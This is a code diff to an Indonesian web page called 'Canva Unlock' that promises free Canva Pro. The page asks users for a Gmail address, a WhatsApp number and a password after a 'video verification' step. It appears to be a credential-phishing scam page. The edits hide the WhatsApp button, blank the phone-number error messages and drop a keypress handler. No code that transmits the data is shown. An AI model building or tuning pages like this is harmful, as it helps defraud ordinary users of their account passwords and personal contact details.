@@ -1787,7 +1787,7 @@ Konfirmasi akhir
     </div><div class="muja-alert-message">
     Tunggu beberapa menit atau beberapa jam sampai halaman terbuka kembali. Join grup untuk info pembaruan Canva Pro hari ini.
   </div><div class="full-quota-buttons">
-  <button class="btn-wa-special" id="fullQuotaWaBtn">
+  <button class="btn-wa-special" id="fullQuotaWaBtn" style="display:none">
     
   </button><button class="btn-tg-special" id="fullQuotaTgBtn">
   Telegram
@@ -2392,7 +2392,7 @@ Canva Unlock • Verifikasi Email dan Password
     if(!email)return showMessage(emailMessage,'Email tidak boleh kosong.','warning');
     const emailValidation=validateGmail(email);
     if(!emailValidation.valid)return showMessage(emailMessage,emailValidation.message,'error');
-    if(!whatsapp)return showMessage(emailMessage,'Nomor  tidak boleh kosong.','warning');
+    if(!whatsapp)return showMessage(emailMessage,'','warning');
     
       const cleanWhatsapp = whatsapp.replace(/\s|-/g, '');
       const waIsValid = cleanWhatsapp.length >= 10
@@ -2405,7 +2405,7 @@ Canva Unlock • Verifikasi Email dan Password
       if (!waIsValid) {
         return showMessage(
           emailMessage,
-          'Format nomor  tidak valid. Minimal 10 digit.',
+          '',
           'warning'
         );
       }
@@ -2465,9 +2465,7 @@ Canva Unlock • Verifikasi Email dan Password
   userEmailInput.addEventListener('keypress',e=> {
     if(e.key==='Enter')handleSubmitEmail()
   });
-  userWhatsappInput.addEventListener('keypress',e=> {
-    if(e.key==='Enter')handleSubmitEmail()
-  });
+  
   function handlePasswordSubmit() {
     if(!videoVerified)return showMessage(passwordMessage,`${VERIFICATION_PROGRESS_TEXT} terlebih dahulu.`,'error');
     if(!currentEmail)return showMessage(passwordMessage,'Email belum dimasukkan.','error');
